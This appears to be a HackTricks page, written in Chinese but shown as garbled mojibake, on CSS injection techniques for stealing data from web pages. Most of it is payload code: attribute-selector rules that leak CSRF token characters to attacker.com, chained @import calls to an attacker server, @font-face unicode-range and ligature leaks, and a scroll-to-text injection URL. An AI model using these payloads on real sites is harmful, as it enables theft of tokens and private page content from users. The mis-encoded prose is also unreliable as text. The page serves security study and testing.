# CSSæ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## CSSæ³¨å…¥

### å±æ€§é€‰æ‹©å™¨

CSSé€‰æ‹©å™¨è¢«è®¾è®¡ç”¨æ¥åŒ¹é…`input`å…ƒç´ çš„`name`å’Œ`value`å±æ€§çš„å€¼ã€‚å¦‚æœè¾“å…¥å…ƒç´ çš„valueå±æ€§ä»¥ç‰¹å®šå­—ç¬¦å¼€å¤´ï¼Œå°†åŠ è½½é¢„å®šä¹‰çš„å¤–éƒ¨èµ„æºï¼š
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
#### é’ˆå¯¹éšè—å…ƒç´ çš„ç»•è¿‡æ–¹æ³•

ä¸ºäº†è§„é¿è¿™ä¸ªé™åˆ¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`~`é€šç”¨å…„å¼Ÿé€‰æ‹©å™¨æ¥å®šä½åç»­çš„å…„å¼Ÿå…ƒç´ ã€‚ç„¶åCSSè§„åˆ™å°†åº”ç”¨äºéšè—è¾“å…¥å…ƒç´ åé¢çš„æ‰€æœ‰å…„å¼Ÿå…ƒç´ ï¼Œä»è€Œå¯¼è‡´èƒŒæ™¯å›¾ç‰‡åŠ è½½ï¼š
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
#### CSSæ³¨å…¥çš„å…ˆå†³æ¡ä»¶

è¦ä½¿CSSæ³¨å…¥æŠ€æœ¯æœ‰æ•ˆï¼Œå¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š

1. **è´Ÿè½½é•¿åº¦**ï¼šCSSæ³¨å…¥å‘é‡å¿…é¡»æ”¯æŒè¶³å¤Ÿé•¿çš„è´Ÿè½½ï¼Œä»¥å®¹çº³ç²¾å¿ƒè®¾è®¡çš„é€‰æ‹©å™¨ã€‚
2. **CSSé‡æ–°è¯„ä¼°**ï¼šæ‚¨åº”è¯¥æœ‰èƒ½åŠ›æ„å»ºé¡µé¢ï¼Œè¿™æ˜¯è§¦å‘ä½¿ç”¨æ–°ç”Ÿæˆçš„è´Ÿè½½é‡æ–°è¯„ä¼°CSSæ‰€å¿…éœ€çš„ã€‚
3. **å¤–éƒ¨èµ„æº**ï¼šè¯¥æŠ€æœ¯å‡å®šèƒ½å¤Ÿä½¿ç”¨å¤–éƒ¨æ‰˜ç®¡çš„å›¾åƒã€‚è¿™å¯èƒ½ä¼šå—åˆ°ç½‘ç«™å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰çš„é™åˆ¶ã€‚

### ç›²ç›®å±æ€§é€‰æ‹©å™¨

æ­£å¦‚[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­è§£é‡Šçš„**](https://portswigger.net/research/blind-css-exfiltration)ï¼Œå¯ä»¥ç»“åˆé€‰æ‹©å™¨**`:has`**å’Œ**`:not`**æ¥è¯†åˆ«ç”šè‡³æ¥è‡ªç›²ç›®å…ƒç´ çš„å†…å®¹ã€‚å½“æ‚¨ä¸çŸ¥é“åŠ è½½CSSæ³¨å…¥çš„ç½‘é¡µä¸­æœ‰ä»€ä¹ˆå†…å®¹æ—¶ï¼Œè¿™éå¸¸æœ‰ç”¨ã€‚\
è¿˜å¯ä»¥ä½¿ç”¨è¿™äº›é€‰æ‹©å™¨ä»å¤šä¸ªç›¸åŒç±»å‹çš„å—ä¸­æå–ä¿¡æ¯ï¼Œå°±åƒåœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ä¸€æ ·ï¼š
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
ç»“åˆä»¥ä¸‹**@import**æŠ€æœ¯ï¼Œå¯ä»¥åˆ©ç”¨**ä»ç›²ç›®é¡µé¢ä¸­ä½¿ç”¨CSSæ³¨å…¥æ¥çªƒå–å¤§é‡ä¿¡æ¯**[**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**ã€‚**

### @import

å‰ä¸€ç§æŠ€æœ¯æœ‰ä¸€äº›ç¼ºç‚¹ï¼Œè¯·æ£€æŸ¥å…ˆå†³æ¡ä»¶ã€‚æ‚¨éœ€è¦èƒ½å¤Ÿ**å‘å—å®³è€…å‘é€å¤šä¸ªé“¾æ¥**ï¼Œæˆ–è€…æ‚¨éœ€è¦èƒ½å¤Ÿ**å°†CSSæ³¨å…¥æ¼æ´é¡µé¢åµŒå…¥åˆ°iframeä¸­**ã€‚

ç„¶è€Œï¼Œè¿˜æœ‰å¦ä¸€ç§å·§å¦™çš„æŠ€æœ¯ï¼Œä½¿ç”¨**CSS `@import`**æ¥æé«˜æŠ€æœ¯çš„è´¨é‡ã€‚

è¿™æ˜¯ç”±[**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf)é¦–æ¬¡å±•ç¤ºçš„ï¼Œå·¥ä½œåŸç†å¦‚ä¸‹ï¼š

ä¸ä»¥å‰çš„æŠ€æœ¯ä¸åŒï¼Œæˆ‘ä»¬ä¸ä¼šä¸€æ¬¡åˆä¸€æ¬¡åœ°åŠ è½½ç›¸åŒçš„é¡µé¢ï¼Œæ¯æ¬¡åŠ è½½æ—¶éƒ½å¸¦æœ‰æ•°åä¸ªä¸åŒçš„æœ‰æ•ˆè´Ÿè½½ï¼ˆå°±åƒä»¥å‰çš„æŠ€æœ¯ä¸€æ ·ï¼‰ï¼Œè€Œæ˜¯**ä»…åŠ è½½ä¸€æ¬¡é¡µé¢ï¼Œåªé€šè¿‡å¯¼å…¥åˆ°æ”»å‡»è€…æœåŠ¡å™¨**ï¼ˆè¿™æ˜¯è¦å‘é€ç»™å—å®³è€…çš„æœ‰æ•ˆè´Ÿè½½ï¼‰ï¼š
```css
@import url('//attacker.com:5001/start?');
```
1. æ”»å‡»è€…å°†ä»**æ”»å‡»è€…é‚£é‡Œæ¥æ”¶ä¸€äº›CSSè„šæœ¬**ï¼Œ**æµè§ˆå™¨å°†åŠ è½½å®ƒ**ã€‚
2. æ”»å‡»è€…å°†å‘é€çš„CSSè„šæœ¬çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯**å†æ¬¡å‘æ”»å‡»è€…æœåŠ¡å™¨å‘é€å¦ä¸€ä¸ª`@import`**ã€‚
3. æ”»å‡»è€…æœåŠ¡å™¨æš‚æ—¶ä¸ä¼šå“åº”æ­¤è¯·æ±‚ï¼Œå› ä¸ºæˆ‘ä»¬å¸Œæœ›æ³„æ¼ä¸€äº›å­—ç¬¦ï¼Œç„¶åå“åº”æ­¤å¯¼å…¥ä»¥æ³„æ¼ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚
4. è´Ÿè½½çš„ç¬¬äºŒéƒ¨åˆ†å°†æ˜¯ä¸€ä¸ª**å±æ€§é€‰æ‹©å™¨æ³„æ¼è´Ÿè½½**ã€‚
5. è¿™å°†å‘æ”»å‡»è€…æœåŠ¡å™¨å‘é€**ç§˜å¯†çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å’Œæœ€åä¸€ä¸ªå­—ç¬¦**ã€‚
6. ä¸€æ—¦æ”»å‡»è€…æœåŠ¡å™¨æ”¶åˆ°**ç§˜å¯†çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­—ç¬¦**ï¼Œå®ƒå°†**å“åº”æ­¥éª¤2ä¸­è¯·æ±‚çš„å¯¼å…¥**ã€‚
7. å“åº”å°†ä¸**æ­¥éª¤2ã€3å’Œ4**å®Œå…¨ç›¸åŒï¼Œä½†è¿™æ¬¡å®ƒå°†å°è¯•**æ‰¾åˆ°ç§˜å¯†çš„ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œç„¶åæ˜¯å€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦**ã€‚

æ”»å‡»è€…å°†**è·Ÿéšè¯¥å¾ªç¯ï¼Œç›´åˆ°æˆåŠŸå®Œå…¨æ³„æ¼ç§˜å¯†**ã€‚

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°åŸå§‹[**Pepe Vilaç”¨äºåˆ©ç”¨æ­¤æ¼æ´çš„ä»£ç **](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)ï¼Œæˆ–è€…æ‚¨å‡ ä¹å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°[**å‡ ä¹ç›¸åŒçš„ä»£ç ä½†æœ‰æ³¨é‡Š**ã€‚](./#css-injection)

{% hint style="info" %}
è¯¥è„šæœ¬å°†å°è¯•æ¯æ¬¡å‘ç°2ä¸ªå­—ç¬¦ï¼ˆä»å¼€å¤´å’Œç»“å°¾ï¼‰å› ä¸ºå±æ€§é€‰æ‹©å™¨å…è®¸æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
è¿™ä½¿å¾—è„šæœ¬èƒ½æ›´å¿«åœ°æ³„éœ²ç§˜å¯†ã€‚
{% endhint %}

{% hint style="warning" %}
æœ‰æ—¶è„šæœ¬**æ— æ³•æ­£ç¡®æ£€æµ‹åˆ°å·²å‘ç°çš„å‰ç¼€ + åç¼€å·²ç»æ˜¯å®Œæ•´æ ‡å¿—**ï¼Œå®ƒä¼šç»§ç»­å‘å‰ï¼ˆåœ¨å‰ç¼€ä¸­ï¼‰å’Œå‘åï¼ˆåœ¨åç¼€ä¸­ï¼‰ç§»åŠ¨ï¼Œæœ€ç»ˆä¼šå¡ä½ã€‚\
åˆ«æ‹…å¿ƒï¼Œåªéœ€æ£€æŸ¥**è¾“å‡º**ï¼Œå› ä¸º**ä½ å¯ä»¥åœ¨é‚£é‡Œçœ‹åˆ°æ ‡å¿—**ã€‚
{% endhint %}

### å…¶ä»–é€‰æ‹©å™¨

ä½¿ç”¨**CSSé€‰æ‹©å™¨**è®¿é—®DOMéƒ¨åˆ†çš„å…¶ä»–æ–¹æ³•ï¼š

* **`.class-to-search:nth-child(2)`**ï¼šè¿™å°†åœ¨DOMä¸­æœç´¢å…·æœ‰ç±»â€œclass-to-searchâ€çš„ç¬¬äºŒä¸ªé¡¹ç›®ã€‚
* **`:empty`** é€‰æ‹©å™¨ï¼šä¾‹å¦‚åœ¨[**æ­¤è§£æ**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**ä¸­ä½¿ç”¨ï¼š**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### åŸºäºé”™è¯¯çš„XS-Search

**å‚è€ƒï¼š**[åŸºäºCSSçš„æ”»å‡»ï¼šæ»¥ç”¨@font-faceçš„unicode-range](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)ï¼Œ[@terjanqçš„åŸºäºé”™è¯¯çš„XS-Search PoC](https://twitter.com/terjanq/status/1180477124861407234)

æ€»ä½“æ„å›¾æ˜¯**ä½¿ç”¨æ¥è‡ªå—æ§ç«¯ç‚¹çš„è‡ªå®šä¹‰å­—ä½“**ï¼Œå¹¶ç¡®ä¿**ä»…å½“æ— æ³•åŠ è½½æŒ‡å®šèµ„æºï¼ˆ`favicon.ico`ï¼‰æ—¶ï¼Œæ–‡æœ¬ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º'A'ï¼‰æ‰ä¼šæ˜¾ç¤ºä¸ºæ­¤å­—ä½“**ã€‚
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **è‡ªå®šä¹‰å­—ä½“ä½¿ç”¨**:
- ä½¿ç”¨`<head>`éƒ¨åˆ†ä¸­çš„`<style>`æ ‡ç­¾å†…çš„`@font-face`è§„åˆ™å®šä¹‰è‡ªå®šä¹‰å­—ä½“ã€‚
- å­—ä½“åä¸º`poc`ï¼Œä»å¤–éƒ¨ç«¯ç‚¹(`http://attacker.com/?leak`)è·å–ã€‚
- å°†`unicode-range`å±æ€§è®¾ç½®ä¸º`U+0041`ï¼Œç›®æ ‡æ˜¯ç‰¹å®šçš„Unicodeå­—ç¬¦'A'ã€‚

2. **å¸¦å¤‡ç”¨æ–‡æœ¬çš„å¯¹è±¡å…ƒç´ **:
- åœ¨`<body>`éƒ¨åˆ†åˆ›å»ºäº†ä¸€ä¸ª`id="poc0"`çš„`<object>`å…ƒç´ ã€‚è¯¥å…ƒç´ å°è¯•ä»`http://192.168.0.1/favicon.ico`åŠ è½½èµ„æºã€‚
- ä¸ºè¯¥å…ƒç´ è®¾ç½®`font-family`ä¸º`'poc'`ï¼Œå¦‚åœ¨`<style>`éƒ¨åˆ†ä¸­å®šä¹‰çš„ã€‚
- å¦‚æœèµ„æº(`favicon.ico`)åŠ è½½å¤±è´¥ï¼Œ`<object>`æ ‡ç­¾å†…çš„å¤‡ç”¨å†…å®¹(å­—æ¯'A')å°†è¢«æ˜¾ç¤ºã€‚
- å¦‚æœå¤–éƒ¨èµ„æºæ— æ³•åŠ è½½ï¼Œå¤‡ç”¨å†…å®¹('A')å°†ä½¿ç”¨è‡ªå®šä¹‰å­—ä½“`poc`è¿›è¡Œå‘ˆç°ã€‚

### æ ·å¼åŒ–æ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µ

ä½¿ç”¨**`:target`**ä¼ªç±»æ¥é€‰æ‹©è¢«**URLç‰‡æ®µ**å®šä½çš„å…ƒç´ ï¼Œå¦‚[CSSé€‰æ‹©å™¨çº§åˆ«4è§„èŒƒ](https://drafts.csswg.org/selectors-4/#the-target-pseudo)ä¸­æ‰€è¿°ã€‚éœ€è¦ç†è§£çš„æ˜¯ï¼Œé™¤éæ–‡æœ¬è¢«ç‰‡æ®µæ˜ç¡®å®šä½ï¼Œå¦åˆ™`::target-text`ä¸ä¼šåŒ¹é…ä»»ä½•å…ƒç´ ã€‚

å½“æ”»å‡»è€…åˆ©ç”¨**æ»šåŠ¨åˆ°æ–‡æœ¬**ç‰‡æ®µåŠŸèƒ½æ—¶ï¼Œä¼šå¼•å‘å®‰å…¨é—®é¢˜ï¼Œå…è®¸ä»–ä»¬é€šè¿‡HTMLæ³¨å…¥ä»å…¶æœåŠ¡å™¨åŠ è½½èµ„æºæ¥ç¡®è®¤ç½‘é¡µä¸Šç‰¹å®šæ–‡æœ¬çš„å­˜åœ¨ã€‚è¯¥æ–¹æ³•æ¶‰åŠæ³¨å…¥ç±»ä¼¼ä»¥ä¸‹çš„CSSè§„åˆ™ï¼š
```css
:target::before { content : url(target.png) }
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœé¡µé¢ä¸Šå­˜åœ¨æ–‡æœ¬â€œç®¡ç†å‘˜â€ï¼Œåˆ™ä¼šä»æœåŠ¡å™¨è¯·æ±‚èµ„æº`target.png`ï¼Œè¡¨ç¤ºæ–‡æœ¬å­˜åœ¨ã€‚å¯ä»¥é€šè¿‡ä¸€ä¸ªç‰¹åˆ¶çš„URLæ‰§è¡Œæ­¤æ”»å‡»å®ä¾‹ï¼Œå…¶ä¸­åŒ…å«æ³¨å…¥çš„CSSä»¥åŠä¸€ä¸ªæ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µï¼š
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
è¿™é‡Œï¼Œæ”»å‡»åˆ©ç”¨HTMLæ³¨å…¥ä¼ è¾“CSSä»£ç ï¼Œé’ˆå¯¹ç‰¹å®šæ–‡æœ¬â€œAdministratorâ€é€šè¿‡Scroll-to-textç‰‡æ®µ(`#:~:text=Administrator`)ã€‚å¦‚æœæ‰¾åˆ°è¯¥æ–‡æœ¬ï¼ŒæŒ‡å®šçš„èµ„æºå°†è¢«åŠ è½½ï¼Œæ— æ„ä¸­å‘æ”»å‡»è€…å‘å‡ºå…¶å­˜åœ¨çš„ä¿¡å·ã€‚

ä¸ºäº†å‡è½»é£é™©ï¼Œåº”æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

1. **å—é™çš„STTFåŒ¹é…**ï¼šScroll-to-text Fragment (STTF)ä»…è®¾è®¡ç”¨äºåŒ¹é…å•è¯æˆ–å¥å­ï¼Œä»è€Œé™åˆ¶å…¶æ³„éœ²ä»»æ„æœºå¯†ä¿¡æ¯æˆ–ä»¤ç‰Œçš„èƒ½åŠ›ã€‚
2. **é™åˆ¶ä¸ºé¡¶å±‚æµè§ˆä¸Šä¸‹æ–‡**ï¼šSTTFä»…åœ¨é¡¶å±‚æµè§ˆä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä¸åœ¨iframeå†…è¿è¡Œï¼Œä½¿ä»»ä½•åˆ©ç”¨å°è¯•æ›´å®¹æ˜“è¢«ç”¨æˆ·æ³¨æ„åˆ°ã€‚
3. **éœ€è¦ç”¨æˆ·æ¿€æ´»**ï¼šSTTFéœ€è¦ç”¨æˆ·æ¿€æ´»æ‰‹åŠ¿æ‰èƒ½è¿è¡Œï¼Œè¿™æ„å‘³ç€åˆ©ç”¨åªèƒ½é€šè¿‡ç”¨æˆ·å‘èµ·çš„å¯¼èˆªæ¥å®ç°ã€‚è¿™ä¸€è¦æ±‚æå¤§åœ°å‡è½»äº†æ”»å‡»åœ¨æ²¡æœ‰ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹è‡ªåŠ¨åŒ–çš„é£é™©ã€‚ç„¶è€Œï¼Œåšå®¢ä½œè€…æŒ‡å‡ºäº†ç‰¹å®šæ¡ä»¶å’Œç»•è¿‡æ–¹å¼ï¼ˆä¾‹å¦‚ç¤¾ä¼šå·¥ç¨‹ã€ä¸æµè¡Œæµè§ˆå™¨æ‰©å±•çš„äº¤äº’ï¼‰ï¼Œå¯èƒ½ä¼šä¿ƒä½¿æ”»å‡»çš„è‡ªåŠ¨åŒ–ã€‚

äº†è§£è¿™äº›æœºåˆ¶å’Œæ½œåœ¨æ¼æ´å¯¹äºç»´æŠ¤ç½‘ç»œå®‰å…¨å¹¶é˜²èŒƒæ­¤ç±»æ”»å‡»ç­–ç•¥è‡³å…³é‡è¦ã€‚

æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸå§‹æŠ¥å‘Šï¼š[https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ£€æŸ¥ä¸€ä¸ª[**ä½¿ç”¨æ­¤æŠ€æœ¯çš„CTFæ¼æ´åˆ©ç”¨**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb)ã€‚

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

æ‚¨å¯ä»¥ä¸ºç‰¹å®šUnicodeå€¼æŒ‡å®š**å¤–éƒ¨å­—ä½“**ï¼Œä»…å½“è¿™äº›Unicodeå€¼å­˜åœ¨äºé¡µé¢ä¸­æ—¶æ‰ä¼š**æ”¶é›†**ã€‚ä¾‹å¦‚ï¼š
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ï¼ˆIï¼‰ï¼šè¿å­— <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**å‚è€ƒèµ„æ–™ï¼š** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

æè¿°çš„æŠ€æœ¯æ¶‰åŠé€šè¿‡åˆ©ç”¨å­—ä½“è¿å­—ä»èŠ‚ç‚¹ä¸­æå–æ–‡æœ¬ï¼Œå¹¶ç›‘è§†å®½åº¦çš„å˜åŒ–ã€‚è¯¥è¿‡ç¨‹æ¶‰åŠå‡ ä¸ªæ­¥éª¤ï¼š

1. **åˆ›å»ºè‡ªå®šä¹‰å­—ä½“**ï¼š
- ä½¿ç”¨å…·æœ‰`horiz-adv-x`å±æ€§çš„å­—å½¢åˆ¶ä½œSVGå­—ä½“ï¼Œè¯¥å±æ€§ä¸ºä»£è¡¨ä¸¤ä¸ªå­—ç¬¦åºåˆ—çš„å­—å½¢è®¾ç½®äº†ä¸€ä¸ªè¾ƒå¤§çš„å®½åº¦ã€‚
- ç¤ºä¾‹SVGå­—å½¢ï¼š`<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`ï¼Œå…¶ä¸­"XY"è¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦åºåˆ—ã€‚
- ç„¶åä½¿ç”¨fontforgeå°†è¿™äº›å­—ä½“è½¬æ¢ä¸ºwoffæ ¼å¼ã€‚

2. **æ£€æµ‹å®½åº¦å˜åŒ–**ï¼š
- ä½¿ç”¨CSSç¡®ä¿æ–‡æœ¬ä¸æ¢è¡Œï¼ˆ`white-space: nowrap`ï¼‰ï¼Œå¹¶è‡ªå®šä¹‰æ»šåŠ¨æ¡æ ·å¼ã€‚
- æ°´å¹³æ»šåŠ¨æ¡çš„å‡ºç°ï¼Œå…·æœ‰ç‹¬ç‰¹æ ·å¼çš„æ»šåŠ¨æ¡ï¼Œä½œä¸ºæŒ‡ç¤ºå™¨ï¼ˆoracleï¼‰ï¼Œè¡¨æ˜æ–‡æœ¬ä¸­å­˜åœ¨ç‰¹å®šçš„è¿å­—ï¼Œå› æ­¤å­˜åœ¨ç‰¹å®šçš„å­—ç¬¦åºåˆ—ã€‚
- æ¶‰åŠçš„CSSï¼š
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **åˆ©ç”¨è¿‡ç¨‹**ï¼š
- **æ­¥éª¤1**ï¼šä¸ºå…·æœ‰å¤§å®½åº¦çš„å­—ç¬¦å¯¹åˆ›å»ºå­—ä½“ã€‚
- **æ­¥éª¤2**ï¼šåˆ©ç”¨åŸºäºæ»šåŠ¨æ¡çš„æŠ€å·§æ¥æ£€æµ‹ä½•æ—¶å‘ˆç°å¤§å®½åº¦å­—å½¢ï¼ˆä»£è¡¨å­—ç¬¦å¯¹çš„è¿å­—ï¼‰ï¼Œè¡¨æ˜å­—ç¬¦åºåˆ—å­˜åœ¨ã€‚
- **æ­¥éª¤3**ï¼šåœ¨æ£€æµ‹åˆ°è¿å­—æ—¶ï¼Œç”Ÿæˆä»£è¡¨ä¸‰ä¸ªå­—ç¬¦åºåˆ—çš„æ–°å­—å½¢ï¼Œå°†æ£€æµ‹åˆ°çš„å¯¹åŠ å…¥å¹¶æ·»åŠ ä¸€ä¸ªå‰å¯¼æˆ–åç»§å­—ç¬¦ã€‚
- **æ­¥éª¤4**ï¼šè¿›è¡Œä¸‰å­—ç¬¦è¿å­—çš„æ£€æµ‹ã€‚
- **æ­¥éª¤5**ï¼šè¯¥è¿‡ç¨‹é‡å¤ï¼Œé€æ¸æ­ç¤ºæ•´ä¸ªæ–‡æœ¬ã€‚

4. **ä¼˜åŒ–**ï¼š
- å½“å‰çš„åˆå§‹åŒ–æ–¹æ³•ä½¿ç”¨`<meta refresh=...`å¹¶ä¸æ˜¯æœ€ä½³çš„ã€‚
- æ›´æœ‰æ•ˆçš„æ–¹æ³•å¯èƒ½æ¶‰åŠä½¿ç”¨CSSçš„`@import`æŠ€å·§ï¼Œå¢å¼ºåˆ©ç”¨çš„æ€§èƒ½ã€‚

### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ï¼ˆIIï¼‰ï¼šä½¿ç”¨é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ï¼ˆæ— éœ€å¤–éƒ¨èµ„æºï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒèµ„æ–™ï¼š** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

è¿™ä¸ªæŠ€å·§æ˜¯åœ¨è¿™ä¸ª[**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/)ä¸­å‘å¸ƒçš„ã€‚å¯ä»¥ä½¿ç”¨æµè§ˆå™¨ä¸­å®‰è£…çš„**é»˜è®¤å­—ä½“**æ³„éœ²æ–‡æœ¬èŠ‚ç‚¹ä¸­ä½¿ç”¨çš„å­—ç¬¦é›†ï¼šä¸éœ€è¦å¤–éƒ¨ -æˆ–è‡ªå®šä¹‰- å­—ä½“ã€‚

è¿™ä¸ªæ¦‚å¿µå›´ç»•ç€åˆ©ç”¨åŠ¨ç”»é€æ¸æ‰©å±•`div`çš„å®½åº¦ï¼Œå…è®¸ä¸€ä¸ªå­—ç¬¦ä¸€æ¬¡ä»æ–‡æœ¬çš„â€œåç¼€â€éƒ¨åˆ†è¿‡æ¸¡åˆ°â€œå‰ç¼€â€éƒ¨åˆ†ã€‚è¿™ä¸ªè¿‡ç¨‹æœ‰æ•ˆåœ°å°†æ–‡æœ¬åˆ†æˆä¸¤éƒ¨åˆ†ï¼š

1. **å‰ç¼€**ï¼šåˆå§‹è¡Œã€‚
2. **åç¼€**ï¼šéšåçš„è¡Œã€‚

å­—ç¬¦çš„è¿‡æ¸¡é˜¶æ®µå¦‚ä¸‹æ‰€ç¤ºï¼š

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

åœ¨è¿™ä¸ªè¿‡æ¸¡è¿‡ç¨‹ä¸­ï¼Œ**unicode-rangeæŠ€å·§**è¢«ç”¨æ¥è¯†åˆ«æ¯ä¸ªæ–°å­—ç¬¦åŠ å…¥å‰ç¼€æ—¶ã€‚é€šè¿‡å°†å­—ä½“åˆ‡æ¢ä¸ºComic Sansï¼Œè¿™ä¸ªå­—ä½“æ˜æ˜¾æ¯”é»˜è®¤å­—ä½“é«˜ï¼Œä»è€Œè§¦å‘å‚ç›´æ»šåŠ¨æ¡ã€‚è¿™ä¸ªæ»šåŠ¨æ¡çš„å‡ºç°é—´æ¥åœ°æ­ç¤ºäº†å‰ç¼€ä¸­æ–°å­—ç¬¦çš„å­˜åœ¨ã€‚

å°½ç®¡è¿™ç§æ–¹æ³•å…è®¸æ£€æµ‹å­—ç¬¦é€ä¸ªå‡ºç°ï¼Œä½†å®ƒå¹¶ä¸æŒ‡å®šé‡å¤çš„æ˜¯å“ªä¸ªå­—ç¬¦ï¼Œåªæ˜¯å‘ç”Ÿäº†é‡å¤ã€‚

{% hint style="info" %}
åŸºæœ¬ä¸Šï¼Œ**unicode-rangeç”¨äºæ£€æµ‹ä¸€ä¸ªå­—ç¬¦**ï¼Œä½†ç”±äºæˆ‘ä»¬ä¸æƒ³åŠ è½½å¤–éƒ¨å­—ä½“ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¦ä¸€ç§æ–¹æ³•ã€‚\
